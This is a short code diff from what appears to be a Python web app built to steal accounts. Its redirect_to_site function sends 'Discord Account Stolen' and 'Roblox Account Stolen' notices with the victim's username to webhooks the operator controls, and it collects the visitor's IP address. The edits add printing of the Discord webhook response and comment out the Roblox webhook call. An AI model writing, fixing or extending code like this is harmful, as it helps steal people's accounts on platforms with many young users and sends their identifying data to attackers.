@@ -13,13 +13,15 @@ def redirect_to_site():
     
     # Send the username to your Discord webhook
     discord_payload = {'content': f'Discord Account Stolen for user: {target_username}'}
-    requests.post(discord_webhook_url, json=discord_payload)
+    response = requests.post(discord_webhook_url, json=discord_payload)
+    print(response.text)  # Print the response from Discord webhook
     
     # Replace 'YOUR_ROBLOX_WEBHOOK_URL' with your Roblox webhook URL
     roblox_webhook_url = 'YOUR_ROBLOX_WEBHOOK_URL'
     # Send the username to your Roblox webhook
     roblox_payload = {'content': f'Roblox Account Stolen for user: {target_username}'}
-    requests.post(roblox_webhook_url, json=roblox_payload)
+    # Uncomment the next line if you have a Roblox webhook URL
+    # response = requests.post(roblox_webhook_url, json=roblox_payload)
     
     # Retrieve the user's IP address
     user_ip = request.remote_addr
